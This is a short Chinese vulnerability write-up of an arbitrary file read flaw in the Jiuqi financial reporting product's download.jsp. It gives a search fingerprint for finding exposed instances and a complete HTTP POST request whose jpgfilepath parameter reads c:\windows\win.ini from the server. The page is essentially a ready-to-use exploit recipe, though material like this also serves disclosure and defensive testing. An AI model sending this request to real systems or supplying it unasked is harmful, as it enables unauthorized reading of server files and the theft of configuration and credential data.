# 久其财务报表 download.jsp 任意文件读取漏洞

## 漏洞描述

久其财务报表 download.jsp 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的信息

## 漏洞影响

<a-checkbox checked>久其财务报表</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="/netrep/"</a-checkbox></br>

## 漏洞复现

登录路径如下



![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313145950658.png)



发送请求包

```plain
POST /netrep/ebook/browse/download.jsp HTTP/1.1
Host: 
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

jpgfilepath=c:\windows\win.ini
```

![image-20220321114620970](../../../.vuepress/public/img/image-20220321114620970.png)